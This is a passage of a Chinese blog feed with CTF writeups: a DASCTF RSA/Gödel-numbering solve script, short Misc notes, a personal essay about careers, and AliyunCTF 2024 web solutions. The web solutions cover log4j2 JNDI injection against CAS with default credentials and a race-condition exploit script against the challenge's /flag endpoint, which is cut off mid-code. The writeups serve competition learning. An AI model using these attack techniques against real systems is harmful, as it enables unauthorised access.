src="https://cdn.nlark.com/yuque/__latex/24a00a92acccd2f5795d9a6932687462.svg#card=math&code=r_i&id=dlDME">了<br>然后本以为结束了，但是发现random_pro的未知信息太多了，爆不了；所以我们可以反复交互靶机，去找到一个“</strong>除去p里的符号以外，剩下的未知信息极少**”的random_pro及tip，最后去爆破此时random_pro的未知信息所对应的随机数，计算出素数p后进行RSA解密即可。<br>这里比较巧合的是——我交互出只有一位不知道的random_pro，所以进行一个23次的循环就行。<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage10.3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">交互得到的信息</span></span><br><span class="line"><span class="string">Please enter a proposition (up to four variables, e.g. p ∧ q): p∧q∧r∧s</span></span><br><span class="line"><span class="string">random_pro: (q∧p)∧(p∧p→q)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c: 41995810424050464263591488554448329862268580803509430819016224815553338100888730896803336612673840017823427423514275862910733716684469925016536292401838549242607815557380733283312997155937593349267904769325582237443602584182267833691493238910650296499006238737051108479</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n: 55175127952509866925917683580771159604579625153201086866979697201304022611177281378259399324843229832453057891022941155251249573902422749989427069699961969897437050838279218610819986530616258141599622993673644866656585227220278835105482801123826751956496319091479635337</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tip: 12114630541506105101731501666541981434969941617155098749915270357037632891606470511445503452415625000000</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Godel</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, <span class="built_in">dict</span></span>):</span><br><span class="line">        self.table = [<span class="string">&#x27;﹁&#x27;</span>, <span class="string">&#x27;∨&#x27;</span>, <span class="string">&#x27;∧&#x27;</span>, <span class="string">&#x27;→&#x27;</span>, <span class="string">&#x27;↔&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;t&#x27;</span>]</span><br><span class="line">        self.<span class="built_in">dict</span> = <span class="built_in">dict</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_dict</span>(<span class="params">self, max_value=<span class="number">30</span></span>):</span><br><span class="line">        res = &#123;&#125;</span><br><span class="line">        used = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> self.table:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                r = randint(<span class="number">1</span>, max_value)</span><br><span class="line">                <span class="keyword">if</span> r <span class="keyword">not</span> <span class="keyword">in</span> used:</span><br><span class="line">                    res[k] = r</span><br><span class="line">                    used.add(r)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_primes</span>(<span class="params">self, count, start=<span class="number">2</span></span>):</span><br><span class="line">        primes = []</span><br><span class="line">        tmp = start</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(primes) &lt; count:</span><br><span class="line">            primes.append(tmp)</span><br><span class="line">            tmp = next_prime(tmp)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> primes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">translate</span>(<span class="params">self, seq</span>):</span><br><span class="line">        p = self.generate_primes(<span class="built_in">len</span>(seq))</span><br><span class="line">        gn = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> c, prime <span class="keyword">in</span> <span class="built_in">zip</span>(seq, p):</span><br><span class="line">            gn *= prime ** self.<span class="built_in">dict</span>[c]</span><br><span class="line">        <span class="keyword">return</span> gn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c= <span class="number">41995810424050464263591488554448329862268580803509430819016224815553338100888730896803336612673840017823427423514275862910733716684469925016536292401838549242607815557380733283312997155937593349267904769325582237443602584182267833691493238910650296499006238737051108479</span></span><br><span class="line">n= <span class="number">55175127952509866925917683580771159604579625153201086866979697201304022611177281378259399324843229832453057891022941155251249573902422749989427069699961969897437050838279218610819986530616258141599622993673644866656585227220278835105482801123826751956496319091479635337</span></span><br><span class="line">tip= <span class="number">12114630541506105101731501666541981434969941617155098749915270357037632891606470511445503452415625000000</span></span><br><span class="line">p = <span class="number">2</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">    table = [<span class="string">&#x27;﹁&#x27;</span>, <span class="string">&#x27;∨&#x27;</span>, <span class="string">&#x27;∧&#x27;</span>, <span class="string">&#x27;→&#x27;</span>, <span class="string">&#x27;↔&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;t&#x27;</span>]</span><br><span class="line">    dic = &#123;i: <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> table&#125;</span><br><span class="line">    <span class="comment"># print(dic)</span></span><br><span class="line">    <span class="comment"># 题目的合取范式是(p)，需要注意一下</span></span><br><span class="line">    cs = <span class="string">&quot;(p∧q∧r∧s)&quot;</span></span><br><span class="line">    <span class="comment"># ds = (p∧q∧r∧s)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cs:</span><br><span class="line">        <span class="keyword">if</span> dic[i] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">while</span> tip % p == <span class="number">0</span>:</span><br><span class="line">                tip //= p</span><br><span class="line">                dic[i] += <span class="number">1</span></span><br><span class="line">            p = next_prime(p)</span><br><span class="line">            <span class="comment"># print(f&quot;&#123;i&#125;: &#123;dic[i]&#125;&quot;, end=&quot;\n&quot;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tip //= p**dic[i]</span><br><span class="line">            p = next_prime(p)</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line">table = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">31</span>) <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> dic.values()]</span><br><span class="line"><span class="comment"># len(table)=23</span></span><br><span class="line"><span class="comment"># 给的random_pro</span></span><br><span class="line">tar = <span class="string">&quot;(q∧p)∧(p∧p→q)&quot;</span></span><br><span class="line"><span class="comment"># 未知信息</span></span><br><span class="line">tar1 = <span class="string">&quot;→&quot;</span></span><br><span class="line"><span class="comment"># 因为len(tar1)=1, 所以只需爆破23种可能性</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(table):</span><br><span class="line">    dic1 = dic</span><br><span class="line">    dic1[tar1] = i</span><br><span class="line">    g = Godel(dic1)</span><br><span class="line">    p = g.translate(tar)</span><br><span class="line">    p = next_prime(p)</span><br><span class="line">    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">        q = n // p</span><br><span class="line">        e = <span class="number">65537</span></span><br><span class="line">        d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># DASCTF&#123;c5aad793-87c0-434a-89db-b750340ef842&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="badmes"><a href="#badmes" class="headerlink" title="badmes"></a>badmes</h3><p>采用最古老的办法，人工判断，是垃圾短信输1，一直到达240分<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1713607498515-ccf94d2d-caec-4478-a8d5-46a7930d4502.png#averageHue=%23252525&clientId=u0c6669cc-0448-4&from=paste&height=255&id=uece0ba83&originHeight=382&originWidth=692&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=48234&status=done&style=none&taskId=u98ace2dd-381f-4662-a119-dfeb60196cb&title=&width=461.3333333333333" alt="{2D1B346F-26D0-4a4a-A020-5B1A2967AA4B}.png"></p><h3 id="tele"><a href="#tele" class="headerlink" title="tele"></a>tele</h3><p>根据<a href="https://zhuanlan.zhihu.com/p/26797664">https://zhuanlan.zhihu.com/p/26797664</a>对P2P通信标准协议之STUN的分析，我们可以轻易地找到发起者的ip<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1713607769286-a4279d92-57b2-4fa4-949f-1db91b30cd2a.png#averageHue=%23f1f1f2&clientId=u0c6669cc-0448-4&from=paste&height=415&id=u9a081c70&originHeight=622&originWidth=1141&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=100106&status=done&style=none&taskId=u95e0c583-fc68-42a4-b523-dc8721bd564&title=&width=760.6666666666666" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1713610140068-47c32099-b91b-4e34-a138-f74658626cd8.png#averageHue=%23cae0f3&clientId=u0c6669cc-0448-4&from=paste&height=698&id=u7cf91d38&originHeight=1047&originWidth=2560&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=367674&status=done&style=none&taskId=ud9f972e0-3be5-4dca-a993-5a207c07381&title=&width=1706.6666666666667" alt="image.png"></p>]]></content>
    
    
    <summary type="html">大伙儿都太厉害了</summary>
    
    
    
    <category term="WriteUp" scheme="http://boogipop.com/categories/WriteUp/"/>
    
    
    <category term="WriteUp" scheme="http://boogipop.com/tags/WriteUp/"/>
    
    <category term="DASCTF" scheme="http://boogipop.com/tags/DASCTF/"/>
    
  </entry>
  
  <entry>
    <title>你想要活出什么样的人生？</title>
    <link href="http://boogipop.com/2024/04/27/%E4%BD%A0%E6%83%B3%E8%A6%81%E6%B4%BB%E5%87%BA%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E4%BA%BA%E7%94%9F%EF%BC%9F/"/>
    <id>http://boogipop.com/2024/04/27/%E4%BD%A0%E6%83%B3%E8%A6%81%E6%B4%BB%E5%87%BA%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E4%BA%BA%E7%94%9F%EF%BC%9F/</id>
    <published>2024-04-26T22:00:04.775Z</published>
    <updated>2024-07-16T12:49:36.932Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一部电影"><a href="#一部电影" class="headerlink" title="一部电影"></a>一部电影</h1><p>在四月初也是赶上了电影的尾巴，宫崎骏的新电影《你想要活出什么样的人生》。看完之后只觉得自己是一头雾水，没有理解宫崎骏先生想表达的深层意思，只觉得故事非常奇幻充满Drama。但是电影的标题一直吸引着我，我想要活出什么样的人生呢？</p><h1 id="当下留给我的选择"><a href="#当下留给我的选择" class="headerlink" title="当下留给我的选择"></a>当下留给我的选择</h1><p>时间一晃，就来到了大三的最后一个学期，大学三年就这么过去了，大学的进度即将到达百分之七十五。那么也是时候迎来2个选择给我了</p><ul><li>考研</li><li>工作</li></ul><p>在这两个里面我其实纠结了很久，三月初情绪很低落，所以想要依靠学习来麻痹自己，就觉得自己是想要考研，就坚持了两个星期，到了后面情绪变得稍微好点后，发现自己好像并不是想要这个结果。<br>在工作和考研这两者其实自己思考了很久，当代绝大多数大学生都是为了考研，可是到底有多少学生知道自己考研能得到什么，能获得什么，性价比如何呢？因此我觉得在决定考研之前，搞清楚考研对自己的意义是重中之重。<br>那么考研的意义究极是什么呢，这里全部以对我自身来说，不包括普遍大众。假如我选择考研，那我必然是奔着2个目的去的</p><ul><li>三年的缓冲期</li><li>更好的工作</li></ul><p>单单看的话，是不是都感觉好像挺划算的，考也不亏，事实确实是这样子。但是我其实一直都对学术性的东西有一点抵触，因为自己不是喜欢学术的人。因此我忽略了就算考上了研究生，所谓的研究生真的是“缓冲三年”吗？会不会每天没有时间留给自己学习呢？会不会遇到网上那些所谓的坏老师呢？三年后工作是否会更好找呢？读研阶段老师是否会让你出去实习呢？研究生的生活我会不会喜欢？<br>并且联想起高中对大学的一些想象，高中的时候就会幻想，大学生活是怎么样子的，满怀期待，觉得奋斗好了高中三年，考上一个好大学，自己的任务就完成了，这也是应试教育危害，会摧残青少年想法。然后到了大学，又考虑起来了考研，好像我们的应试人生始终无法达到一个尽头。<br>以上种种问题都充满着不确定性，我对研究生的看法依旧是来自网上的片面之词，让我觉得考研实则就是一场豪赌。可能这也是我不敢把重心全部放在考研上的一个原因。我不想放弃现在已有的基础，我想继续在此基础上发展。想依靠自己的内心作出决定，自己的内心是不排斥工作的，但是在考研的时候，我会有一种被强迫的感觉。<br>于是在三月底选择了加入春招的海投大军。当时自己还说笑着说：”白天上班、晚上高数”。其实稍微想想都不是那么现实。<br>所以，该做出选择了。</p><h1 id="到底怎么样才算优秀？"><a href="#到底怎么样才算优秀？" class="headerlink" title="到底怎么样才算优秀？"></a>到底怎么样才算优秀？</h1><p>其实我这2个月一直在思考一个问题，那就是如何定义一个人是优秀的？<br>假如单纯的看一个人在某个领域取得的成绩，比如考试分数或者是获奖，那么肯定是远远不足的。所谓的优秀，是对你这个人本身的一种肯定，肯定的是身为一个人在社会上的综合素质，因此我们需要学习各种东西</p><ul><li>人际交往，如何让人和你聊天很舒服</li><li>团队处理，身处一个团队中，处于不同的身份，该如何与团队相处</li><li>心理素质，遇到挫折，遇到困难，遇到情绪问题的时候如何去应对，如何快速的调节自己</li><li>外貌因素，为什么我要把这一点列入进来？这其实是我自己所认为的一点。外貌也是实力的一种。</li><li>生活习惯，要有一个良好健康的生活习惯，身体是革命的本钱，爱惜其他东西之前先爱惜自身身体。</li><li>技术实力，也就是所谓的硬实力，在某一领域有自己的特长。</li><li>等其他因素</li></ul><p>因此这么一套流程分析下来，我就会觉得自己离优秀还差很远，也不会去评价其他人是否优秀。所谓优秀，实则遥不可及。我能做到的就是尽可能变得优秀。</p><h1 id="如何调节自身情绪"><a href="#如何调节自身情绪" class="headerlink" title="如何调节自身情绪?"></a>如何调节自身情绪?</h1><p>每一个人都会遇到一些令人心情不愉快的事情，亦或者是一些令人悲伤的事情。我们如何快速的从负面情绪中走出来成为了一门学问。我也是在最近发现了一些适用于自己的方法</p><ul><li>脑袋放空，嘴巴张开：字面意思，不想任何事情，去买一些零食，一边吃一边看视频。</li><li>累了就睡：一旦发现自己无法支撑，那么躺下来其实就是最好的选择。不要勉强自己，要让自己舒服。</li><li>蓝调时间：所谓的蓝调并不是什么Emo或者是网易云，蓝调时间就是给自己一个人独处的时间，一个人呆着的时候会感受到无比的平静，适合我们思考问题。</li><li>笑着诉说自己的情绪：一个人消化情绪永远不是长久之计，应该学会开口，其实我自身以前是很喜欢所有结果一个人承担，不开心或者难过的事情都会一个人默默消化，长久下来就会导致自己变得内向。这并不是好结果，和人笑着诉说自己的痛苦是一种方式。</li><li>心流状态：就算遇到了烦心事，我们只要进入了一个状态就不会去想烦心事，这种状态就是所谓的心流，我们只需要关注我们想做的事情即可。</li></ul><h1 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h1><p>因为某些原因选择了不考研去工作，经过了1个月的面试笔试的折磨，最终在春招末尾加入了美团安全。希望自己以后能变得更好吧。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>随笔瞎写，纯属宣泄一下个人情绪，假如对你有帮助那就更好了。</p>]]></content>
    
    
    <summary type="html">Life</summary>
    
    
    
    <category term="ThinkAbout" scheme="http://boogipop.com/categories/ThinkAbout/"/>
    
    
    <category term="life" scheme="http://boogipop.com/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>AliyunCTF 2024 Web Writeup</title>
    <link href="http://boogipop.com/2024/03/25/AliyunCTF%202024%20Web%20Writeup%EF%BC%88Blog%20ver)/"/>
    <id>http://boogipop.com/2024/03/25/AliyunCTF%202024%20Web%20Writeup%EF%BC%88Blog%20ver)/</id>
    <published>2024-03-25T09:39:55.058Z</published>
    <updated>2024-03-25T09:42:31.370Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711301123436-005a6248-4fd9-4a7b-bbd5-126b659c2955.png#averageHue=%231d2727&clientId=u3e6d7a15-9bcf-4&from=paste&height=896&id=u009e4768&originHeight=1792&originWidth=3250&originalType=binary&ratio=2&rotation=0&showTitle=false&size=3630260&status=done&style=none&taskId=u39f8bb3c-c19b-4e6b-bbe0-2af99f0255d&title=&width=1625" alt="image.png"><br>我们是第三，各位师傅都尽力了太厉害了！</p><h1 id="Chain17"><a href="#Chain17" class="headerlink" title="Chain17"></a>Chain17</h1><p>0day就不公开了</p><h1 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h1><p>命令拼贴导致任意文件读取。<br>挺简单一题<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711353675265-086a6925-d252-483a-a763-c2fa6ea8a472.png#averageHue=%2396ad88&clientId=ufe14a54f-09e6-4&from=paste&height=750&id=u20791dc0&originHeight=1500&originWidth=2754&originalType=binary&ratio=2&rotation=0&showTitle=false&size=828131&status=done&style=none&taskId=u87fe02be-3ebb-4450-98e2-53f014c05fd&title=&width=1377" alt="image.png"><br>右上角解码可以看到flag</p><h1 id="easyCAS"><a href="#easyCAS" class="headerlink" title="easyCAS"></a>easyCAS</h1><p>虽然说是考cas5.x，但不是反序列化的洞，是log4j2！想都没想到这傻逼居然是log4j2！<br>源码：<br><a href="https://github.com/apereo/cas/tree/v5.3.16">https://github.com/apereo/cas/tree/v5.3.16</a><br>条件:</p><ul><li>默认密码  casuser&#x2F;Mellon</li><li>debug开启</li><li>如何RCE<br><a href="https://curz0n.github.io/2020/01/17/apereo_cas_deserialize/">https://curz0n.github.io/2020/01/17/apereo_cas_deserialize&#x2F;</a><br>Whynot war包<br><a href="https://mvnrepository.com/artifact/org.apereo.cas/cas-server-webapp-tomcat/5.3.16">https://mvnrepository.com/artifact/org.apereo.cas/cas-server-webapp-tomcat/5.3.16</a></li></ul><p>一开始没理解他说的debug模式是什么，以为是tomcat的debug，会输出日志文件，最终读取日志拿到key，打老反序列化的洞。结果不是，其实当时应该注意到log4j2.xml的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711353807713-79bac250-92f7-491a-a441-cd449643d7e6.png#averageHue=%23352c1f&clientId=ufe14a54f-09e6-4&from=paste&height=404&id=u4a0d060e&originHeight=808&originWidth=944&originalType=binary&ratio=2&rotation=0&showTitle=false&size=111085&status=done&style=none&taskId=ue960bdfd-d1b5-4a39-98c4-c65262d802b&title=&width=472" alt="image.png"><br>项目文件配置了log4j2，默认就带这个，并且你可以看到在反序列化漏洞的入口点有这么一段<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711353853012-06458d5a-b113-4eaf-b092-c9b2a2a95609.png#averageHue=%23222326&clientId=ufe14a54f-09e6-4&from=paste&height=524&id=ufec693e9&originHeight=1048&originWidth=2502&originalType=binary&ratio=2&rotation=0&showTitle=false&size=295261&status=done&style=none&taskId=u8890550a-24a3-466a-b6c6-45119688917&title=&width=1251" alt="image.png"><br>它调用了logger.debug方法。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711354253218-d1c074f9-f3c4-4bbb-82c5-6427a22dd4f0.png#averageHue=%232a2c31&clientId=ufe14a54f-09e6-4&from=paste&height=707&id=u30233107&originHeight=1414&originWidth=1994&originalType=binary&ratio=2&rotation=0&showTitle=false&size=403487&status=done&style=none&taskId=u65e0e3e3-b11b-43e4-b8cf-3f6fa7b0850&title=&width=997" alt="image.png"><br>获取的是log4j2的logger，因此直接打JNDI注入了，spring的话直接打了snakeyaml链。</p><h1 id="PasteBin"><a href="#PasteBin" class="headerlink" title="PasteBin"></a>PasteBin</h1><p>条件竞争<br>这道题自己实现了golang的路由，做了一个仿gin框架的东西。但是有一个地方设计的有问题。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711356251773-c83c3eef-9184-4cb4-a86a-7eca98b4db4f.png#averageHue=%23212226&clientId=ufe14a54f-09e6-4&from=paste&id=uda1560a9&originHeight=1280&originWidth=2252&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u26e95c11-ce4a-4238-87ce-dd3e9fb8065&title="><br>每一个路由都是由Handle方法去处理的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711356251718-a5d5ea0f-8745-4f38-b820-ec03c1f60f21.png#averageHue=%23202226&clientId=ufe14a54f-09e6-4&from=paste&id=ue44e8b29&originHeight=482&originWidth=1650&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u0222687e-4446-4886-98b7-2d7dcea6285&title="><br>启用了多个Http，但是需要注意这里<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711356251771-742cac08-afde-4de9-a656-cfcb1718660d.png#averageHue=%23515047&clientId=ufe14a54f-09e6-4&from=paste&id=uf83be1ba&originHeight=142&originWidth=736&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ua1d79aa2-0272-4e41-91db-eeca10ee61a&title="><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711356251828-b8fadbe7-e17f-466e-8540-8ee5ab68207a.png#averageHue=%23222427&clientId=ufe14a54f-09e6-4&from=paste&id=u0ace053b&originHeight=442&originWidth=1632&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u4069d659-ac19-4bcc-a873-fc5d93b3a81&title="><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711356251694-6385ad47-ef63-47da-bc05-c97d708394a6.png#averageHue=%23496670&clientId=ufe14a54f-09e6-4&from=paste&id=u78d101fc&originHeight=442&originWidth=1612&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ubf197832-b37c-4dd7-a1a9-184f0de5ef9&title="><br>这三个流程告诉我们的信息就是context上下文所有路由都公用。<br>再看看路由<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711356252429-5165407a-ec94-448e-a1b1-0634bc848a74.png#averageHue=%23202327&clientId=ufe14a54f-09e6-4&from=paste&id=u2fce5e08&originHeight=1314&originWidth=1374&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uafb774cf-710b-4eda-ad03-2dcd00d4bee&title="><br>既然是自己实现的框架，那就看一下它的中间件功能是如何实现的吧<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711356252447-43f15d3b-a5d0-4326-aab7-7fccd7ff0991.png#averageHue=%23202226&clientId=ufe14a54f-09e6-4&from=paste&id=u0dd86a95&originHeight=504&originWidth=1518&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u9554018a-2cff-42fb-aa3f-69dc3fcc472&title="><br>它的中间件是在run方法里去手动调用的，然后我们看看flag获取的逻辑吧<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711356252391-87efc741-b9d6-40f5-b83e-00f3e33617ae.png#averageHue=%23222327&clientId=ufe14a54f-09e6-4&from=paste&id=ud5ff4fbb&originHeight=430&originWidth=1180&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u3b3ead95-58de-4da0-a5cb-b8f5084a002&title="><br>访问就送，但是有个鉴权模块<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711356252823-47854e10-2284-4061-afe4-fbc4f39183e9.png#averageHue=%23202225&clientId=ufe14a54f-09e6-4&from=paste&id=u770f0c11&originHeight=836&originWidth=1518&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u079ee744-db30-4d9e-a6dc-a06aa129341&title="><br>结合上述的几个条件其实不难想到，我们要做的就只是绕过权限而已，并不需要伪造真正的admin，由于ctx是共享的，那么ctx的属性也会被影响<br>设想一下：假如一个进程访问flag（需要onlyAdmin），一个路由访问普通用户路由（不需要onlyAdmin），那么在这里条件竞争一下，ctx.mws是不是就被污染了呢？那我们就绕过了onlyAdmin访问到了flagHandler。<br>还有最后一个点<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1711356252428-46d0406f-ed4e-4906-a057-7e715468cf16.png#averageHue=%23202225&clientId=ufe14a54f-09e6-4&from=paste&id=u33e59de2&originHeight=1084&originWidth=1638&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ud92a4bf9-b29e-4d73-bb1a-be6a5c726f2&title="><br>如果内容有flag那么会给你清空了，但是注意上面的if，我们只需要页面的output有admin字眼就行，我们create一个title为admin的内容就行了，然后一边访问flag一边访问&#x2F;paste&#x2F;view就行了。<br>最终拿下flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">pollute_url=<span class="string">&quot;http://web2.aliyunctf.com:33861/paste/view?id=8a0c750b-508f-4433-891d-a51c385c79b1&quot;</span></span><br><span class="line">flag_url=<span class="string">&quot;http://web2.aliyunctf.com:33861/flag&quot;</span></span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">&quot;token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTEzNjI0MzgsInVzZXJuYW1lIjoiYm9vZ2lwb3AifQ.5NeTLjpNskLo8vk9ZymuvSo99awdCKvV80Q78ynrRHU&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollute</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = requests.get(pollute_url,cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;aliyunctf&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     r=requests.get(flag_url)</span><br><span class="line"></span><br><span class="line">event = threading.Event()</span><br><span class="line">event.<span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    <span 